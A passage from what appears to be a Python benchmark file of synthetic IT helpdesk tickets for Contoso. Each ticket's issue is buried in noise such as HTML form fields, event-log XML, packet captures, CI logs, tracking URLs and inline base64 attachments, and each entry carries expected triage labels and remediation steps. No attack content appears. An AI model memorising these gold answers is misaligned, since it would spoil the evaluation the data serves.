                'value="a8f3e2d1-b7c9-4a6e-91f5-2c8d7e3b4a1f"\n'
                'input type="hidden" name="__session_id" '
                'value="sess_Kj8mNp2qRtL1vW5x"\n'
                'input type="hidden" name="employee_id" '
                'value="EMP-4521"\n'
                'input type="hidden" name="cost_center" '
                'value="CC-7200-TRADING"\n'
                'input type="hidden" name="approval_chain" '
                'value="MGR:sarah.chen|VP:james.wu|CFO:auto"\n'
                'select name="expense_type"\n'
                '  option value="travel"\n'
                '  option value="equipment" selected\n'
                '  option value="software"\n'
                "/select\n"
                'input type="text" name="amount" '
                'value="2,450.00"\n'
                'textarea name="description"'
                "New ergonomic standing desk for my workstation"
                "/textarea\n"
                'input type="submit" value="Submit"\n\n'
                "When I click submit it says 'Error: Request "
                "timeout after 30000ms'. The amount is $2,450 "
                "for a new standing desk. I've tried three times "
                "and same error every time."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[
                MissingInfo.ERROR_MESSAGE,
                MissingInfo.ENVIRONMENT_DETAILS,
            ],
            next_best_action=(
                "Investigate timeout error on the expense report "
                "portal during form submission — likely a backend "
                "API issue since the user gets consistent 30s "
                "timeouts."
            ),
            remediation_steps=[
                "Check the expense portal API logs for timeout errors on the /api/v2/expenses/submit endpoint.",
                "Verify backend service health and database connectivity for the expense processing system.",
                "Check if there is a known issue with the expense portal deployment or recent changes.",
                "As a workaround, ask the user to submit the "
                "expense via the mobile app or email to "
                "expenses@contoso.com.",
                "Monitor the portal for recurring timeout issues and escalate if systemic.",
            ],
            reporter_name="Marcus Johnson",
            reporter_email="marcus.johnson@contoso.com",
            reporter_department="Trading",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "form-artifacts",
                "hidden-fields",
                "html-noise",
            ],
            difficulty="medium",
        ),
        # ── DC-069  Windows Event Log XML blocks ─────────────────────────
        ScenarioDefinition(
            scenario_id="DC-069",
            subject="Recurring BSOD on my workstation — Event Logs",
            description=(
                "My workstation keeps blue-screening 2-3 times "
                "per day. I exported the relevant Event Log entries "
                "as XML:\n\n"
                '<Event xmlns="http://schemas.microsoft.com/'
                'win/2004/08/events/event">\n'
                "  <System>\n"
                '    <Provider Name="Microsoft-Windows-Kernel-'
                'Power" Guid="{331C3B3A-2005-44C2-AC5E-77220C37'
                'D6B4}"/>\n'
                "    <EventID>41</EventID>\n"
                "    <Level>1</Level>\n"
                "    <Task>63</Task>\n"
                "    <Keywords>0x8000400000000002</Keywords>\n"
                '    <TimeCreated SystemTime="2026-03-18T'
                '08:14:33.0000000Z"/>\n'
                "    <Computer>NYC-WS-3847.contoso.local"
                "</Computer>\n"
                "  </System>\n"
                "  <EventData>\n"
                '    <Data Name="BugcheckCode">209</Data>\n'
                '    <Data Name="BugcheckParameter1">0xfffff802'
                "1a3c7b10</Data>\n"
                '    <Data Name="BugcheckParameter2">0x2</Data>\n'
                '    <Data Name="SleepInProgress">0</Data>\n'
                '    <Data Name="PowerButtonTimestamp">0'
                "</Data>\n"
                "  </EventData>\n"
                "</Event>\n\n"
                '<Event xmlns="http://schemas.microsoft.com/'
                'win/2004/08/events/event">\n'
                "  <System>\n"
                '    <Provider Name="Microsoft-Windows-'
                'WER-SystemErrorReporting"/>\n'
                "    <EventID>1001</EventID>\n"
                "    <Level>2</Level>\n"
                '    <TimeCreated SystemTime="2026-03-18T'
                '08:14:45.0000000Z"/>\n'
                "    <Computer>NYC-WS-3847.contoso.local"
                "</Computer>\n"
                "  </System>\n"
                "  <EventData>\n"
                '    <Data Name="DumpFile">C:\\Windows\\MEMORY'
                ".DMP</Data>\n"
                '    <Data Name="ReportId">a7f3e2d1-b8c9-4f6a'
                "</Data>\n"
                "  </EventData>\n"
                "</Event>\n\n"
                "The BSOD shows KERNEL_MODE_HEAP_CORRUPTION. "
                "Machine is a Dell Latitude 5540, 16GB RAM, "
                "Windows 11 23H2. The crashes seem to happen "
                "when I have Excel and Bloomberg open at the "
                "same time."
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Investigate recurring BSOD with KERNEL_MODE_"
                "HEAP_CORRUPTION on NYC-WS-3847 — bugcheck code "
                "209 suggests a kernel-mode driver is corrupting "
                "the heap. Correlates with Excel + Bloomberg "
                "concurrent usage."
            ),
            remediation_steps=[
                "Collect the MEMORY.DMP from C:\\Windows and analyze with WinDbg to identify the faulting driver.",
                "Check for updated drivers for the Dell Latitude 5540, especially display and chipset drivers.",
                "Verify the Bloomberg Terminal driver/plugin is compatible with Windows 11 23H2.",
                "Run Windows Memory Diagnostic to rule out faulty RAM.",
                "If driver analysis is inconclusive, replace the "
                "workstation with a fresh image and reinstall "
                "applications incrementally to isolate the cause.",
            ],
            reporter_name="Victoria Chang",
            reporter_email="victoria.chang@contoso.com",
            reporter_department="Equity Trading",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "event-log",
                "xml-dump",
                "windows-events",
            ],
            difficulty="medium",
        ),
        # ── DC-070  Wireshark / tcpdump packet capture output ────────────
        ScenarioDefinition(
            scenario_id="DC-070",
            subject=("Intermittent connectivity — packet capture attached"),
            description=(
                "My connection to the Singapore data center keeps "
                "dropping. I ran a tcpdump capture and here is a "
                "snippet:\n\n"
                "$ sudo tcpdump -i eth0 host 10.30.1.50 -n\n"
                "08:14:01.223 IP 10.20.5.117.49832 > 10.30.1.50"
                ".443: Flags [S], seq 2847193625, win 64240\n"
                "08:14:01.287 IP 10.30.1.50.443 > 10.20.5.117"
                ".49832: Flags [S.], seq 1938274651, ack "
                "2847193626, win 65535\n"
                "08:14:01.287 IP 10.20.5.117.49832 > 10.30.1.50"
                ".443: Flags [.], ack 1, win 64240\n"
                "08:14:01.350 IP 10.20.5.117.49832 > 10.30.1.50"
                ".443: Flags [P.], seq 1:518, ack 1, win 64240\n"
                "08:14:01.414 IP 10.30.1.50.443 > 10.20.5.117"
                ".49832: Flags [P.], seq 1:1453, ack 518, win "
                "65535\n"
                "...(normal traffic for ~8 minutes)...\n"
                "08:22:17.891 IP 10.20.5.117.49832 > 10.30.1.50"
                ".443: Flags [P.], seq 48291:48809, ack 127350, "
                "win 64240\n"
                "08:22:18.891 IP 10.20.5.117.49832 > 10.30.1.50"
                ".443: Flags [P.], seq 48291:48809, ack 127350, "
                "win 64240  [TCP Retransmission]\n"
                "08:22:20.891 IP 10.20.5.117.49832 > 10.30.1.50"
                ".443: Flags [P.], seq 48291:48809, ack 127350, "
                "win 64240  [TCP Retransmission]\n"
                "08:22:24.891 IP 10.20.5.117.49832 > 10.30.1.50"
                ".443: Flags [R.], seq 48809, ack 127350, win 0\n"
                "\n"
                "You can see the connection works fine initially "
                "but after about 8 minutes I start getting TCP "
                "retransmissions and then the connection resets. "
                "This happens every 8-10 minutes. I'm on Floor 7, "
                "Building 1, New York office."
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "Investigate recurring TCP connection resets to "
                "Singapore data center (10.30.1.50) after ~8 min "
                "of normal traffic — likely a stateful firewall "
                "or NAT table timeout issue."
            ),
            remediation_steps=[
                "Check firewall session timeout settings on the "
                "path between NYC and Singapore — 8-minute drops "
                "suggest a session table expiry.",
                "Verify TCP keepalive settings on both endpoints to ensure sessions stay active.",
                "Check the WAN link utilization and packet loss between NYC and Singapore offices.",
                "Review recent firewall or network configuration changes that may have reduced session timeouts.",
                "If firewall timeouts are the cause, increase the "
                "TCP session timeout or enable TCP keepalive "
                "passthrough.",
            ],
            reporter_name="James Liu",
            reporter_email="james.liu@contoso.com",
            reporter_department="Data Engineering",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "packet-capture",
                "tcpdump",
                "network-diagnostics",
            ],
            difficulty="hard",
        ),
        # ── DC-071  GitHub Actions CI pipeline log ───────────────────────
        ScenarioDefinition(
            scenario_id="DC-071",
            subject="Internal deployment pipeline broken since Monday",
            description=(
                "Our CI/CD pipeline for the client-reporting-api "
                "has been failing since Monday. Here is the GitHub "
                "Actions output:\n\n"
                "Run #847 \u2014 build-and-deploy.yml\n"
                "Triggered by: push to main (commit a4f8e2d)\n\n"
                "\u2705 Step 1/7: Checkout (2s)\n"
                "  Syncing repository: contoso/client-reporting-"
                "api\n"
                "  HEAD is now at a4f8e2d Fix: add null check "
                "for client ID\n\n"
                "\u2705 Step 2/7: Setup Node.js 20 (3s)\n"
                "  Successfully setup Node.js 20.11.1\n\n"
                "\u2705 Step 3/7: Install dependencies (28s)\n"
                "  npm ci --ignore-scripts\n"
                "  added 1,247 packages in 27s\n\n"
                "\u2705 Step 4/7: Lint (12s)\n"
                "  > eslint src/ --max-warnings 0\n"
                "  No warnings or errors found.\n\n"
                "\u274c Step 5/7: Test (45s)\n"
                "  > jest --ci --coverage\n"
                "  PASS src/services/auth.test.ts (2.1s)\n"
                "  PASS src/services/client.test.ts (1.8s)\n"
                "  FAIL src/services/report.test.ts (3.2s)\n"
                "    \u25cf generateReport > should handle large "
                "portfolios\n"
                "      Expected: 200\n"
                "      Received: 500\n"
                "      at Object.<anonymous> (report.test.ts"
                ":47)\n"
                "  Tests: 1 failed, 23 passed, 24 total\n"
                "  Coverage: 87.3% (threshold: 80%)\n\n"
                "\u23f9 Step 6/7: Build (skipped)\n"
                "\u23f9 Step 7/7: Deploy to Azure (skipped)\n\n"
                "The test that's failing was working before the "
                "database schema migration that ran Monday "
                "morning. Can someone look at this?"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate failing test in client-reporting-api "
                "CI pipeline — report.test.ts:47 returns 500 "
                "instead of 200 for large portfolios. Likely "
                "caused by Monday's database schema migration."
            ),
            remediation_steps=[
                "Review the database schema migration that ran "
                "Monday and check for breaking changes to the "
                "report generation query.",
                "Run the failing test locally with verbose output to get the full error stack trace.",
                "Check if the report generation endpoint handles "
                "the new schema correctly, especially for large "
                "portfolio datasets.",
                "If the migration introduced a new column or changed a type, update the report service code to match.",
                "Once fixed, re-run the CI pipeline and verify all 24 tests pass.",
            ],
            reporter_name="Nina Torres",
            reporter_email="nina.torres@contoso.com",
            reporter_department="Backend Engineering",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "ci-pipeline",
                "github-actions",
                "build-log",
            ],
            difficulty="easy",
        ),
        # ── DC-072  Massive tracking URL parameters ──────────────────────
        ScenarioDefinition(
            scenario_id="DC-072",
            subject="SAP Fiori link not working from email",
            description=(
                "I received a notification email from SAP about "
                "an approval I need to complete, but the link in "
                "the email doesn't work. Here's the full URL I'm "
                "clicking:\n\n"
                "https://contoso-sap-prod.dispatcher.launchpad"
                ".cfapps.us10.hana.ondemand.com/sites#Workflow-"
                "approve&/approval/PO-2026-11892?sap-client=100"
                "&sap-language=EN&sap-theme=sap_horizon&sap-"
                "ui-language=en-US&sap-shell-navmode=embedded"
                "&utm_source=sap_notification&utm_medium=email"
                "&utm_campaign=po_approval_q1_2026&utm_content="
                "approve_button&utm_term=purchase_order&mkt_tok="
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOi"
                "IxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRta"
                "W4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFO"
                "NfAHjNc&session_id=s_78a2f3b1c4e9d0g6h5&track="
                "click_po_approve_20260318_091500_user4521&ref="
                "email_notification_v3&correlation_id=corr-"
                "a8f3e2d1-b7c9-4a6e-91f5-2c8d7e3b4a1f&"
                "device_id=did_Kj8mNp2qRtL1vW5x&analytics_"
                "session=as_9f2e1d3c4b5a6&user_segment=finance_"
                "approver_tier2&exp_variant=approval_flow_v4\n\n"
                "When I click it I get a 'Page not found' error. "
                "I need to approve PO-2026-11892 before end of "
                "day — it's for the quarterly software license "
                "renewals for the Trading floor.\n\n"
                "Chrome shows the URL gets cut off at the '?' "
                "when I paste it."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate broken SAP Fiori approval link from "
                "email notification — URL contains excessive "
                "tracking parameters that may be causing parsing "
                "issues. User needs to approve PO-2026-11892."
            ),
            remediation_steps=[
                "Provide the user with a clean direct link to the SAP approval page without the tracking parameters.",
                "Verify the SAP Fiori Launchpad is accessible at the base URL and the approval workflow is active.",
                "Check if the email notification template is "
                "generating malformed URLs with excessive query "
                "parameters.",
                "Report the URL truncation issue to the SAP notification team for template correction.",
                "As a workaround, have the user navigate to the "
                "SAP portal directly and find the pending approval "
                "in their inbox.",
            ],
            reporter_name="Lisa Nakamura",
            reporter_email="lisa.nakamura@contoso.com",
            reporter_department="Finance",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "tracking-urls",
                "long-urls",
                "url-noise",
            ],
            difficulty="easy",
        ),
        # ── DC-073  Calendar invite spam / ICS data ──────────────────────
        ScenarioDefinition(
            scenario_id="DC-073",
            subject=("FW: FW: FW: Accepted: Quarterly Budget Review (was: FW: Declined: Team Standup)"),
            description=(
                "Begin forwarded message:\n"
                "From: Calendar System <noreply@contoso.com>\n"
                "Subject: Accepted: Quarterly Budget Review\n\n"
                "BEGIN:VCALENDAR\n"
                "VERSION:2.0\n"
                "PRODID:-//Microsoft Corporation//Outlook 16.0\n"
                "METHOD:REPLY\n"
                "BEGIN:VEVENT\n"
                "DTSTART:20260320T140000Z\n"
                "DTEND:20260320T150000Z\n"
                "SUMMARY:Quarterly Budget Review\n"
                "LOCATION:NYC-Conf-12A (12th Floor)\n"
                "ORGANIZER:mailto:sarah.chen@contoso.com\n"
                "ATTENDEE;RSVP=TRUE:mailto:james.wu@contoso.com\n"
                "ATTENDEE;RSVP=TRUE:mailto:maria.santos@contoso"
                ".com\n"
                "STATUS:CONFIRMED\n"
                "UID:040000008200E001-A8F3E2D1B7C9@contoso.com\n"
                "END:VEVENT\n"
                "END:VCALENDAR\n\n"
                "--- Previous forward ---\n"
                "BEGIN:VCALENDAR\n"
                "VERSION:2.0\n"
                "METHOD:CANCEL\n"
                "BEGIN:VEVENT\n"
                "DTSTART:20260318T093000Z\n"
                "DTEND:20260318T094500Z\n"
                "SUMMARY:Team Standup\n"
                "STATUS:CANCELLED\n"
                "END:VEVENT\n"
                "END:VCALENDAR\n\n"
                "---\n\n"
                "Hi IT, in between all these calendar "
                "notifications \u2014 our Outlook desktop client "
                "is creating duplicate calendar events for every "
                "meeting. Accepted meetings show up twice and "
                "cancelled ones don't disappear. This started "
                "after the M365 update last week. It's affecting "
                "everyone in the Finance department.\n\n"
                "Elena Rossi\nFinance"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P4,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[
                MissingInfo.APPLICATION_VERSION,
                MissingInfo.AFFECTED_USERS,
            ],
            next_best_action=(
                "Investigate Outlook duplicate calendar event "
                "issue affecting the Finance department after "
                "the latest M365 update — accepted meetings "
                "appear twice and cancelled events persist."
            ),
            remediation_steps=[
                "Check the M365 admin center for known issues with the latest Outlook update affecting calendar sync.",
                "Verify the Exchange calendar processing settings for affected mailboxes.",
                "Run 'outlook.exe /cleanreminders' and "
                "'/resetnavpane' on an affected machine to clear "
                "corrupted calendar cache.",
                "If the issue is widespread, consider rolling back the M365 update for the Finance department.",
                "Report the issue to Microsoft support if no known fix exists.",
            ],
            reporter_name="Elena Rossi",
            reporter_email="elena.rossi@contoso.com",
            reporter_department="Finance",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "calendar-forward",
                "ics-spam",
                "auto-forward",
            ],
            difficulty="medium",
        ),
        # ── DC-074  Pasted spreadsheet data with misaligned columns ──────
        ScenarioDefinition(
            scenario_id="DC-074",
            subject="Portfolio reconciliation data mismatch",
            description=(
                "There's a mismatch in the reconciliation data "
                "between our system and the custodian. I pasted "
                "the comparison from Excel below but the columns "
                "got messed up:\n\n"
                "Account\tOur Qty\tCust Qty\tDiff\tStatus\n"
                "PF-2847\t10,000\t10,000\t0\tOK\n"
                "PF-2848\t5,500\t5,250\t250\tMISMATCH\n"
                "PF-2849\t\t8,200\t-8200\tMISSING_LOCAL\n"
                "PF-2850\t3,750\t3,750\t0\tOK\n"
                "PF-2851\t12,000\t12,500\t-500\tMISMATCH\n"
                "PF-2852\t7,100\t\t7100\tMISSING_CUSTODIAN\n"
                "PF-2853\t22,000\t22,000\t0\tOK\n"
                "PF-2854\t450\t450\t0\tOK\n"
                "PF-2855\t8,900\t9,100\t-200\tMISMATCH\n"
                "PF-2856\t15,000\t15,000\t0\tOK\n\n"
                "As you can see, PF-2849 is completely missing "
                "from our database, and PF-2852 is missing from "
                "the custodian's feed. The other mismatches might "
                "be timing issues from Friday's settlement.\n\n"
                "This is blocking our daily NAV calculation which "
                "needs to go out to clients by 10 AM. Can someone "
                "from the Data Platform team check the overnight "
                "reconciliation ETL job?\n\n"
                "Priya Sharma\nFund Administration"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.TIMESTAMP],
            next_best_action=(
                "Investigate overnight reconciliation ETL "
                "failure causing portfolio data mismatches — "
                "2 accounts missing entirely and 3 with quantity "
                "discrepancies. Blocking daily NAV calculation."
            ),
            remediation_steps=[
                "Check the overnight reconciliation ETL job logs for errors or incomplete runs.",
                "Investigate PF-2849 (missing from local DB) "
                "and PF-2852 (missing from custodian feed) — "
                "may be new accounts not yet mapped.",
                "For the quantity mismatches (PF-2848, PF-2851, "
                "PF-2855), check if Friday's settlement "
                "transactions were fully processed.",
                "Re-run the reconciliation ETL with the latest custodian data feed.",
                "Provide the corrected data to Fund Admin so the NAV calculation can proceed.",
            ],
            reporter_name="Priya Sharma",
            reporter_email="priya.sharma@contoso.com",
            reporter_department="Fund Administration",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "spreadsheet-paste",
                "misaligned-columns",
                "tabular-data",
            ],
            difficulty="medium",
        ),
        # ── DC-075  ANSI escape codes and control characters ─────────────
        ScenarioDefinition(
            scenario_id="DC-075",
            subject="Network monitoring tool showing errors",
            description=(
                "Our Nagios monitoring dashboard is showing "
                "critical alerts. I copied the output from the "
                "terminal but it has weird characters:\n\n"
                "\x1b[1;31m[CRITICAL]\x1b[0m Host: "
                "prod-web-04.contoso.local — PING CRITICAL "
                "- Packet loss = 100%\n"
                "\x1b[1;31m[CRITICAL]\x1b[0m Service: "
                "prod-web-04/HTTP — Connection refused\n"
                "\x1b[1;33m[WARNING]\x1b[0m  Host: "
                "prod-db-02.contoso.local — PING WARNING "
                "- Packet loss = 12%\n"
                "\x1b[1;32m[OK]\x1b[0m       Host: "
                "prod-web-01.contoso.local — PING OK "
                "- 0% packet loss\n"
                "\x1b[1;32m[OK]\x1b[0m       Host: "
                "prod-web-02.contoso.local — PING OK "
                "- 0% packet loss\n"
                "\x1b[1;31m[CRITICAL]\x1b[0m Service: "
                "prod-web-04/HTTPS — Connection refused\n"
                "\x1b[1;33m[WARNING]\x1b[0m  Service: "
                "prod-db-02/MySQL — Slow query detected "
                "(avg 4.2s)\n"
                "\x1b[1;32m[OK]\x1b[0m       Service: "
                "prod-web-01/HTTP — HTTP/1.1 200 OK "
                "- 127ms response time\n\n"
                "It looks like prod-web-04 is completely down "
                "(100% packet loss and both HTTP and HTTPS "
                "refusing connections). Also prod-db-02 has "
                "intermittent packet loss and slow queries. Can "
                "someone check these servers?"
            ),
            category=Category.NETWORK,
            priority=Priority.P3,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.TIMESTAMP],
            next_best_action=(
                "Investigate prod-web-04 down alert — 100% "
                "packet loss and HTTP/HTTPS connection refused. "
                "Also check prod-db-02 for 12% packet loss and "
                "slow MySQL queries."
            ),
            remediation_steps=[
                "Check physical/virtual status of prod-web-04 "
                "— verify it is powered on and reachable from "
                "the management network.",
                "If the server is responsive via console, check "
                "for OS-level issues (disk full, kernel panic, "
                "hung processes).",
                "Restart the HTTP/HTTPS services on prod-web-04 if the OS is healthy.",
                "For prod-db-02, investigate the slow queries "
                "and 12% packet loss — check network interface "
                "errors and query execution plans.",
                "Update the Nagios monitoring team on findings and any remediation actions taken.",
            ],
            reporter_name="Thomas Weber",
            reporter_email="thomas.weber@contoso.com",
            reporter_department="DevOps",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "ansi-codes",
                "control-characters",
                "terminal-noise",
            ],
            difficulty="medium",
        ),
        # ── DC-076  Extremely long email with issue buried at the very end ──
        ScenarioDefinition(
            scenario_id="DC-076",
            subject="RE: RE: RE: Multiple items — printer, badge, parking, and laptop dock issue",
            description=(
                "Hi IT team,\n\n"
                "I wanted to follow up on a few things.\n\n"
                "First, regarding the printer on Floor 7 — it seems to be working now after "
                "someone replaced the toner. Thanks for that. I noticed it was jamming a bit "
                "yesterday but today it printed my 50-page report with no issues.\n\n"
                "Second, my badge stopped working at the south entrance on Monday but I used "
                "the north entrance and it was fine. I think it might be the reader on the "
                "south door rather than my badge. I asked security and they said they'd look "
                "into it. Let me know if you need me to file a separate ticket for that.\n\n"
                "Third, the parking garage barrier was stuck on Tuesday morning. I had to wait "
                "about 15 minutes for someone to manually raise it. By the time I got back in "
                "the evening it was working fine. I mention this just in case it's related to "
                "the building systems.\n\n"
                "Also, I saw that the kitchen coffee machine on Floor 5 is showing an error "
                "message. Not sure if that falls under IT but figured I'd mention it. The "
                "error code was E-42 or something like that.\n\n"
                "Oh and one more thing — I moved offices last week from Building 2 to "
                "Building 4 and the wireless coverage here is much worse. I keep getting "
                "dropped from Teams calls. But that's a separate issue I think.\n\n"
                "Anyway, the reason I'm actually writing is about my laptop docking station. "
                "Since I moved to the new office in Building 4, Floor 3, my Lenovo ThinkPad "
                "X1 Carbon won't detect the external monitors when I plug it into the USB-C "
                "dock. The dock powers the laptop and the keyboard and mouse work, but neither "
                "of the two Dell U2722D monitors gets a signal. I've tried different USB-C "
                "cables and both Thunderbolt ports on the laptop. My colleague's laptop works "
                "fine with the same dock and monitors, so it seems to be something specific to "
                "my machine. This is really impacting my productivity because I'm working on a "
                "dual-monitor workflow for the Q2 risk models.\n\n"
                "Thanks,\nAisha\n\n"
                "---\n"
                "Aisha Okonkwo | Senior Risk Analyst\n"
                "Risk Management | Building 4, Floor 3\n"
                "Contoso Financial Services\n"
                "This email and any attachments are confidential and intended solely for the "
                "addressee. If you have received this email in error, please notify the sender "
                "immediately and delete the message. Any unauthorized use, disclosure, or "
                "distribution is prohibited. Contoso Financial Services is regulated by the "
                "Financial Conduct Authority (FCA) and the Prudential Regulation Authority "
                "(PRA). Registered in England and Wales. Company No. 12345678."
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Investigate USB-C dock display output failure on Lenovo ThinkPad X1 "
                "Carbon in Building 4, Floor 3 — dock provides power and peripherals "
                "but neither Dell U2722D monitor receives video signal."
            ),
            remediation_steps=[
                "Check Thunderbolt/USB-C firmware on the ThinkPad X1 Carbon and update if needed.",
                "Verify display drivers (Intel/NVIDIA) are up to date on the laptop.",
                "Test with a known-good USB-C dock to isolate whether the issue is dock or laptop.",
                "Check if the dock firmware needs an update for dual 4K monitor support.",
                "If the issue persists, check BIOS settings for Thunderbolt security level.",
            ],
            reporter_name="Aisha Okonkwo",
            reporter_email="aisha.okonkwo@contoso.com",
            reporter_department="Risk Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "very-long-email", "buried-issue", "multi-topic", "rambling"],
            difficulty="hard",
        ),
        # ── DC-077  Massive base64-encoded PDF inline in email body ──────
        ScenarioDefinition(
            scenario_id="DC-077",
            subject="Error report from compliance scanner — see attached PDF",
            description=(
                "Hi IT,\n\n"
                "The compliance scanner flagged some issues on our trading floor servers. I "
                "tried to attach the PDF but our email system embedded it inline. Here's the "
                "full report:\n\n"
                "data:application/pdf;base64,JVBERi0xLjQKMSAwIG9iago8PAovVHlwZSAvQ2F0YW"
                "xvZwovUGFnZXMgMiAwIFIKPj4KZW5kb2JqCjIgMCBvYmoKPDwKL1R5cGUgL1BhZ2Vz"
                "Ci9LaWRzIFszIDAgUl0KL0NvdW50IDEKL01lZGlhQm94IFswIDAgNjEyIDc5Ml0KPj"
                "4KZW5kb2JqCjMgMCBvYmoKPDwKL1R5cGUgL1BhZ2UKL1BhcmVudCAyIDAgUgovQ29u"
                "dGVudHMgNCAwIFIKL1Jlc291cmNlcyA8PAovRm9udCA8PAovRjEgNSAwIFIKPj4KPj"
                "4KPj4KZW5kb2JqCjQgMCBvYmoKPDwKL0xlbmd0aCA0NAo+PgpzdHJlYW0KQlQKL0Yx"
                "IDE4IFRmCjEwMCA3MDAgVGQKKENvbXBsaWFuY2UgUmVwb3J0KSBUagpFVAplbmRzdH"
                "JlYW0KZW5kb2JqCjUgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL1N1YnR5cGUgL1R5cGUx"
                "Ci9CYXNlRm9udCAvSGVsdmV0aWNhCj4+CmVuZG9iago2IDAgb2JqCjw8Ci9UeXBlIC"
                "/SW5mbyAKL1Byb2R1Y2VyIChDb250b3NvIENvbXBsaWFuY2UgU2Nhbm5lcikKL0Ny"
                "ZWF0aW9uRGF0ZSAoRDoyMDI2MDMxNzA5MDAwMCkKPj4KZW5kb2JqCnhyZWYKMCA3"
                "CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwMDAwOSAwMDAwMCBuIAowMDAwMMDAw"
                "NTggMDAwMDAgbiAKMDAwMDAwMDE1MSAwMDAwMCBuIAowMDAwMDAwMzIyIDAwMMDAwI"
                "G4gCjAwMDAwMDA0MTYgMDAwMDAgbiAKMDAwMDAwMDUwMSAwMDAwMCBuIAp0cmFpbG"
                "VyCjw8Ci9TaXplIDcKL1Jvb3QgMSAwIFIKL0luZm8gNiAwIFIKPj4Kc3RhcnR4cm"
                "VmCjYxNAolJUVPRgo=\n\n"
                "The key finding is that three servers on the trading floor (TRDSVR-01, "
                "TRDSVR-02, TRDSVR-04) have outdated TLS certificates that expire this "
                "Friday. If they're not renewed before market open Monday, the trading "
                "platform connections to the clearing house will fail. TRDSVR-03 was "
                "renewed last month so it's fine.\n\n"
                "Can someone prioritize getting those certs renewed? The clearing house "
                "requires TLS 1.3 with certs from our approved CA.\n\n"
                "Thanks,\nNikhil"
            ),
            category=Category.SECURITY,
            priority=Priority.P2,
            team=Team.SECURITY_OPS,
            needs_escalation=True,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "Renew expiring TLS certificates on TRDSVR-01, TRDSVR-02, and TRDSVR-04 "
                "before Friday to prevent clearing house connection failures at Monday "
                "market open."
            ),
            remediation_steps=[
                "Verify current TLS certificate expiry dates on TRDSVR-01, -02, and -04.",
                "Generate certificate signing requests (CSRs) from the approved internal CA.",
                "Install renewed TLS 1.3 certificates on each server and restart the TLS services.",
                "Test connectivity to the clearing house endpoint from each server.",
                "Update the certificate monitoring dashboard and set renewal alerts for 30 days prior.",
            ],
            reporter_name="Nikhil Gupta",
            reporter_email="nikhil.gupta@contoso.com",
            reporter_department="Compliance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64", "pdf-embed", "inline-binary", "compliance-report"],
            difficulty="hard",
        ),
        # ── DC-078  Base64 images interspersed in every reply of email chain ─
        ScenarioDefinition(
            scenario_id="DC-078",
            subject="RE: RE: Screen flickering issue — more screenshots",
            description=(
                "Hi Amy,\n\n"
                "Here's another screenshot showing the flickering. It happens every 10 seconds.\n\n"
                "[inline-image-3.png]\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAFUlE"
                "QVQoU2P8z8BQz0AEYBxVSHIVAvcHBQHzKSECAAAAAElFTkSuQmCC\n\n"
                "You can see the horizontal lines appearing across the top third of the screen.\n\n"
                "--- On Mar 15, Amy wrote ---\n"
                "Thanks for the first screenshot. Can you try a different cable?\n\n"
                "--- On Mar 14, Carlos wrote ---\n"
                "Here's a screenshot of the flickering:\n\n"
                "[inline-image-2.png]\n"
                "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgMCAgMDAwMEAwME"
                "BQgFBQQEBQoHBwYIDAoMCwsKCwsKDA0QDRANBQ0KCwsNDg4PDw8NDwwMEBQUFBQUFBQUFP/bAEMB"
                "AwQEBQQFCQUFCQ0LCw0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0N"
                "DQ0NDf/AABEIAB4AHgMBIQACEQEDEQH/xAAYAAEBAQEBAAAAAAAAAAAAAAAABgUHCP/EACgQAAICAg"
                "EDBAAHAAAAAAAAAAECAwQRBQAGEiExE0FRFGFxgZH/2gAMAwEAAhEDEQA/AOvxxx2OOZeqt/\n\n"
                "[inline-image-1.png]\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4"
                "2mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==\n\n"
